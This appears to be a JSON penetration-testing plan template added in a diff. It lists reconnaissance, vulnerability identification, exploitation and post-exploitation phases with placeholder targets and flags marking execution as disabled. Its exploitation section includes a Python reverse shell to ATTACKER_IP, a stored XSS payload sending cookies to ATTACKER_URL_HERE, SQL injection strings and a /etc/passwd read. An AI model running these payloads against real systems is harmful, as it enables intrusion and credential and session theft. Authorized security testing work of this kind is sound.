@@ -1,0 +1,140 @@
+{
+  "scope_constraints": {
+    "target_address": "TARGET_IP_HERE",
+    "target_protocol": "TARGET_PROTOCOL_HERE",
+    "execution_boundary": "planning_only"
+  },
+  "attack_recipe": {
+    "phases": {
+      "reconnaissance": {
+        "objective": "Comprehensive target mapping and service identification",
+        "tool_suite": {
+          "nmap": {
+            "installation": "sudo apt install nmap",
+            "basic_scan": "nmap -sV -sC TARGET_IP_HERE",
+            "service_scan": "nmap -sV -p PORT_RANGE TARGET_IP_HERE",
+            "script_scan": "nmap -sC --script=SCRIPT_NAME TARGET_IP_HERE"
+          },
+          "whatweb": {
+            "installation": "gem install whatweb",
+            "basic_usage": "whatweb TARGET_URL_HERE"
+          }
+        },
+        "output_analysis": {
+          "important_indicators": ["Open ports", "Service versions", "Potential CVE matches"],
+          "data_processing": "grep -E 'open|version' nmap_output.txt"
+        }
+      },
+      "vulnerability_identification": {
+        "objective": "Technical vulnerability validation and exploit matching",
+        "tool_suite": {
+          "searchsploit": {
+            "basic_search": "searchsploit SERVICE_NAME",
+            "exploit_examination": "searchsploit -x EXPLOIT_ID"
+          },
+          "nuclei": {
+            "installation": "go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei",
+            "template_scan": "nuclei -u TARGET_URL_HERE -t PATH_TO_TEMPLATE"
+          }
+        },
+        "manual_techniques": [
+          "Version comparison against CVE databases",
+          "Service banner analysis for known vulnerable versions",
+          "Configuration option enumeration"
+        ]
+      },
+      "vulnerability_exploitation": {
+        "technical_examples": {
+          "sql_injection": {
+            "manual_technique": {
+              "detection": "Target_URL_HERE?param=' OR 1=1--",
+              "confirmation": "Target_URL_HERE?param=' UNION SELECT 1,2,3--"
+            },
+            "tool_usage": {
+              "sqlmap": "sqlmap -u TARGET_URL_HERE --forms"
+            }
+          },
+          "remote_code_execution": {
+            "manual_technique": {
+              "python_example": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ATTACKER_IP,ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i])"
+            },
+            "tool_usage": {
+              "metasploit": "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp"
+            }
+          },
+          "cross_site_scripting": {
+            "manual_technique": {
+              "reflected_xss": "Target_URL_HERE?param=<script>alert(1)</script>",
+              "stored_xss": "Inject: <script>new Image().src='ATTACKER_URL_HERE?cookie='+document.cookie;</script>"
+            },
+            "tool_usage": {
+              "xssstrike": "xssstrike -u TARGET_URL_HERE"
+            }
+          }
+        },
+        "safety_boundaries": {
+          "code_execution": "disabled",
+          "payload_delivery": "disabled",
+          "active_exploitation": "disabled"
+        }
+      },
+      "exploitation": {
+        "objective": "Technical exploit development methodology",
+        "framework_usage": {
+          "metasploit": {
+            "module_selection": "use EXPLOIT_MODULE",
+            "target_configuration": "set RHOSTS TARGET_IP_HERE",
+            "payload_selection": "show payloads"
+          }
+        },
+        "manual_techniques": [
+          "Exploit code adaptation for target environment",
+          "Payload encoding and obfuscation methods",
+          "Custom exploit development workflow"
+        ],
+        "safety_parameters": {
+          "connection_timeout": "5 minutes",
+          "session_limit": "1",
+          "activity_scope": "single target only"
+        }
+      },
+      "post_exploitation": {
+        "objective": "Privilege analysis and impact demonstration",
+        "tool_suite": {
+          "native_commands": {
+            "windows": ["whoami", "ipconfig /all", "net user"],
+            "linux": ["id", "ifconfig -a", "cat /etc/passwd"]
+          }
+        },
+        "manual_procedures": [
+          "Privilege escalation path mapping",
+          "Network propagation analysis",
+          "Data access verification"
+        ]
+      }
+    },
+    "output_format": {
+      "red_team_technical_level": true,
+      "tool_configurations": true,
+      "command_syntax": true,
+      "output_samples": true,
+      "manual_techniques": true
+    }
+  },
+  "technical_safeguards": {
+    "command_execution": "disabled",
+    "active_scanning": "disabled",
+    "payload_generation": "disabled",
+    "network_activity": "disabled"
+  },
+  "phase_boundaries": {
+    "setup_requirements": {
+      "target_validation": "Confirm scope authorization",
+      "tool_preparation": "Install and configure required tools"
+    },
+    "procedure_documentation": {
+      "step_by_step_recording": "Document each technical action",
+      "result_logging": "Record expected output samples"
+    }
+  }
+}
